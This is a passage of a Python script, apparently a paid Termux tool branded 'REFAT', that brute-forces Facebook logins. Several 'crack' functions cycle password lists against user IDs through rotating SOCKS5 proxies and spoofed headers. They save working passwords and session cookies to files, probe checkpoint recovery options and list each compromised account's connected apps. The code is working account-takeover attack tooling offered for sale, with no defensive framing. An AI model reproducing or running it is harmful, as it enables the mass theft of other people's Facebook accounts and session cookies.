				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('')
				print('') 
				print('😁 [REFAT-OK] 😁') 
				print('')
				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------------------[ METHODE-TOUCH-3 ]---------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{b}[REFAT-CRACK] --> {P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('')
				print('') 
				print('😪 [REFAT-CP] 😪')
				print('') 
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('')
				print('') 
				print('😁 [REFAT-OK] 😁') 
				print('')
				print(f'\r{H}>> {idf}|{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def cracktouch(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{b}REFAT-CRACK-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='REFAT CP'))
					open('/sdcard/REFAT-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/REFAT-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='REFAT-OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/REFAT-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold][•] LIST ACTIVE APPLICATIONS :[/bold] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold][{nok}] {muncul[0]} {muncul[1]}[/bold]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for APKS in apkexp:
						hit+=1
						infoakun += (f"[{hit}] {APKS[0]} {APKS[1]}\n")
					print('\n')
					statusok = f'{H}\nð‘€ð‘Ÿ_ð¾ð´ð‘ˆð‘†ð´ð‘… ð‘‚ð¾ã€âœ”ã€‘\nâ”ð™ð™„ð˜¿âžœ{idf}\nâ”—ð™‹ð˜¼ð™Žð™Žð™’ð™Šð™ð˜¿âžœ{pw}\nð˜¾ð™Šð™Šð™†ð™„ð™€âžœ {kuki}\nð™ð™Žð™€ð™ ð˜¼ð™‚ð™€ð™‰ð™âžœ {ua}\nð˜¼ð™‹ð™† ð™‡ð™„ð™Žð™âžœ {infoakun}'
					ok+=1
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{b}REFAT-CRACK-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				elif 'ya' in princp:
					print('\n')
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='REFAT-156 CP'))
					open('/sdcard/REFAT-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/REFAT-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/REFAT-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold][•] LIST ACTIVE APPLICATIONS :[/bold] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold][{nok}] {muncul[0]} {muncul[1]}[/bold]\n")
						nok+=1

					hit=0
					infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]REFAT-156 OK[/bold green]'))
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPTION-CHEKPOINT ]---------------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Check Login In Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------[ CHECK-OPTION-CHEKPOINT 2 ]---------------------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLICATION ]--------------
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    rs="REFAT-"
    refat="VAi-"
    os.system('clear')
    print(logo)
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
    r1=requests.get("https://raw.githubusercontent.com/REFAT-156/PUBLIC/main/Approval.txt").text
    if key1 in r1:
        login() 
    else:
        os.system("clear")
        print(logo)
        os.system("xdg-open https://github.com/REFAT-156")
        print('') 
        print ("\033[92;1m[\033[91;1m●\033[92;1m] \033[92;1m𝘿𝙊 𝙉𝙊𝙏 𝙋𝙍𝙀𝙎𝙎 𝙀𝙉𝙏𝙀𝙍 𝙄𝙁 𝙔𝙊𝙐 𝘼𝙍𝙀 𝘼 𝙁𝙍𝙀𝙀 𝙐𝙎𝙀𝙍 ")
        print ('') 
        print ("[\033[91;1m●\033[92;1m] \033[92;1m𝙔𝙊𝙐𝙍 𝙆𝙀𝙔 : "+rs+refat+key1)
        print('') 
        input("[\033[91;1m●\033[92;1m] \033[92;1m𝙋𝙍𝙀𝙎𝙎 𝙀𝙉𝙏𝙀𝙍 𝙏𝙊 𝘽𝙐𝙔 𝙏𝙃𝙄𝙎 𝙏𝙊𝙊𝙇𝙎 ") 
        print ('')
        time.sleep(3.5)
        tks = '𝙃𝙀𝙇𝙇𝙊%20𝙍𝙀𝙁𝘼𝙏%20𝙎𝙃𝘼𝙃𝙍𝙄𝘼𝙍%20𝙑𝘼𝙄,%20𝙋𝙇𝙀𝘼𝙎𝙀%20𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿%20𝙈𝙔%20𝙆𝙀𝙔%20𝙏??%20𝙋𝙍𝙀𝙈𝙄𝙐𝙈✓✓%20%20%20%20%20𝙈𝙔%20%20𝙆𝙀𝙔%20%20:%20'+rs+refat+key1
        os.system('am start https://wa.me/+8801613732902?text=' + tks)
